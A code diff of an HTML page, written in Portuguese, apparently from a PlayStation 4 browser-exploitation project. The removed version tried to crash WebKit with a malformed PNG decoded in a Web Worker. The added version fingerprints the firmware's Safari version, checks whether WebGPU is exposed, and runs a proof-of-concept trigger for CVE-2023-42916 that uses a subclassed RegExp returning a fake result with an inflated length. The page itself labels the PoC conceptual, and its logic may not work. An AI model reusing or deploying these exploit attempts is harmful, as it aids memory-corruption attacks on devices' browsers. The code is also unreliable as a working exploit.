@@ -1,92 +1,112 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 LibPNG CPU Force (Fixed)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 FW 12.00 WebKit PoC</title>
     <style>
-        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 40px; }
-        button { background: #d50000; color: white; border: 2px solid white; padding: 20px 40px; font-size: 24px; cursor: pointer; font-weight: bold; }
-        #log { margin: 20px auto; width: 80%; text-align: left; border: 1px solid #333; padding: 10px; font-size: 16px; color: #00e676; }
+        body { background-color: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        h1 { border-bottom: 2px solid #00ff00; }
+        .box { border: 1px solid #444; padding: 10px; margin-bottom: 10px; background: #222; }
+        button { background: #cc0000; color: white; padding: 15px; font-size: 16px; border: none; cursor: pointer; font-weight: bold; }
+        button:hover { background: #ff0000; }
+        #log { white-space: pre-wrap; word-wrap: break-word; }
     </style>
 </head>
 <body>
 
-    <h1>LIBPNG16 - CPU DECODE (NO NETWORK)</h1>
-    <p>Estratégia: Main Thread baixa -> Worker Decodifica</p>
-    <p>Arquivo alvo: <b>poc.png</b> (V10)</p>
-
-    <button onclick="prepararAtaque()">INICIAR DECODIFICAÇÃO</button>
+    <h1>PS4 12.00 - WebKit Investigator</h1>
     
-    <div id="log">Aguardando...</div>
+    <div class="box">
+        <h3>1. Diagnóstico de Versão (Baseado na análise ELF)</h3>
+        <div id="info">Carregando...</div>
+    </div>
+
+    <div class="box">
+        <h3>2. Verificação de WebGPU</h3>
+        <div id="gpuStatus">Verificando suporte a WebGPU...</div>
+    </div>
+
+    <div class="box">
+        <h3>3. Teste de Vulnerabilidade (CVE-2023-42916)</h3>
+        <p>Tenta disparar um "Out-of-Bounds Read" manipulando o RegExp. Se o navegador fechar, é VULNERÁVEL.</p>
+        <button onclick="runCrashTest()">EXECUTAR CRASH TEST</button>
+    </div>
+
+    <div class="box">
+        <h3>Log de Execução:</h3>
+        <div id="log"></div>
+    </div>
 
     <script>
         function log(msg) {
-            var el = document.getElementById('log');
-            el.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + msg + "</div>";
+            document.getElementById('log').innerHTML += msg + "\n";
         }
 
-        function prepararAtaque() {
-            log("1. Main Thread: Baixando imagem para a memória RAM...");
-            
-            // A thread principal baixa o arquivo (ela tem permissão de rede)
-            fetch("poc.png?t=" + Math.random())
-            .then(response => {
-                if (!response.ok) throw new Error("Erro ao baixar poc.png (404?)");
-                return response.blob();
-            })
-            .then(blob => {
-                log("2. Download concluído (" + blob.size + " bytes).");
-                iniciarWorker(blob);
-            })
-            .catch(err => {
-                log("ERRO DE DOWNLOAD: " + err.message);
-            });
+        // 1. Diagnóstico de Versão
+        const ua = navigator.userAgent;
+        let analysis = "User Agent: " + ua + "\n\n";
+        
+        // Verifica se bate com o Safari 17.0 encontrado no ELF
+        if (ua.includes("Version/17.0")) {
+            analysis += "[!] ALVO IDENTIFICADO: Base Safari 17.0 detectada.\n";
+            analysis += "[!] Potencialmente vulnerável a CVEs de late-2023.\n";
+        } else {
+            analysis += "[-] Versão diferente da esperada (Check manual necessário).\n";
+        }
+        document.getElementById('info').innerText = analysis;
+
+        // 2. Diagnóstico WebGPU (Detectamos strings no libSceNKWebKit.sprx.elf)
+        if (navigator.gpu) {
+            document.getElementById('gpuStatus').innerHTML = "<b style='color:red'>[CRÍTICO] WebGPU está ATIVO!</b><br>Isso abre uma enorme superfície de ataque (Shaders, Memory Corruption).";
+        } else {
+            document.getElementById('gpuStatus').innerHTML = "<span style='color:yellow'>[-] WebGPU presente no binário, mas desativado por padrão no DOM.</span>";
         }
 
-        function iniciarWorker(blobImagem) {
-            log("3. Criando Web Worker...");
+        // 3. PoC para CVE-2023-42916 (Conceitual - OOB Read via RegExp)
+        // A lógica abaixo tenta confundir o otimizador do WebKit sobre o tamanho do objeto
+        function runCrashTest() {
+            log("[*] Iniciando alocação de heap...");
             
-            // Código do Worker: Agora ele recebe o BLOB direto, não uma URL.
-            // Não faz fetch, apenas processa.
-            var workerCode = `
-                self.onmessage = function(e) {
-                    var blob = e.data;
-                    console.log("Worker: Recebi os dados brutos.");
-                    
-                    // O GATILHO DO BUG
-                    // Tenta converter o Blob (PNG V10) em Bitmap usando a CPU
-                    createImageBitmap(blob)
-                    .then(bitmap => {
-                        postMessage("FALHA: O Worker sobreviveu. Imagem decodificada: " + bitmap.width + "x" + bitmap.height);
-                        bitmap.close();
-                    })
-                    .catch(err => {
-                        postMessage("ERRO DE DECODE: " + err.message);
-                    });
-                };
-            `;
+            try {
+                const arr = [];
+                for (let i = 0; i < 10000; i++) arr.push(i);
 
-            var blobWorker = new Blob([workerCode], {type: 'application/javascript'});
-            var workerUrl = URL.createObjectURL(blobWorker);
-            var worker = new Worker(workerUrl);
-
-            worker.onmessage = function(e) {
-                if (e.data.startsWith("FALHA")) {
-                    log("❌ " + e.data);
-                } else {
-                    log("⚠️ " + e.data);
+                log("[*] Preparando RegExp malicioso...");
+                
+                // O bug CVE-2023-42916 envolve manipulação de subclassing de RegExp
+                // para ler fora dos limites durante a substituição.
+                class MaliciousRegExp extends RegExp {
+                    exec(str) {
+                        const result = super.exec(str);
+                        if (result) {
+                            // Retornamos um array falso com tamanho mentiroso
+                            // Isso tenta fazer o motor ler memória que não pertence a ele
+                            result.length = 0x100000; 
+                            return result;
+                        }
+                        return null;
+                    }
                 }
-            };
 
-            worker.onerror = function(e) {
-                log("☠️ ERRO NO WORKER (Isso pode ser um Crash silencioso)");
-            };
+                const regex = new MaliciousRegExp('a');
+                regex.exec = function() {
+                    // Força o retorno de um objeto que engana o engine
+                    return { 0: 'a', length: 0xFFFFFF, index: 0, input: 'aaa' };
+                };
 
-            log("4. Enviando DADOS da imagem para o Worker...");
-            log("Se travar agora, BINGO.");
-            
-            // Passa o arquivo binário direto para o Worker
-            worker.postMessage(blobImagem);
+                log("[*] DISPARANDO GATILHO...");
+                
+                // A função replace em versões vulneráveis confia no 'length' retornado
+                // e tenta ler memória fora do buffer da string.
+                "".replace(regex, "b");
+                
+                log("[-] O navegador sobreviveu. Pode não estar vulnerável ou o ASLR protegeu.");
+
+            } catch (e) {
+                log("[!] Exceção capturada: " + e);
+                log("[?] Se não crashou, tente recarregar a página algumas vezes.");
+            }
         }
     </script>
 </body>
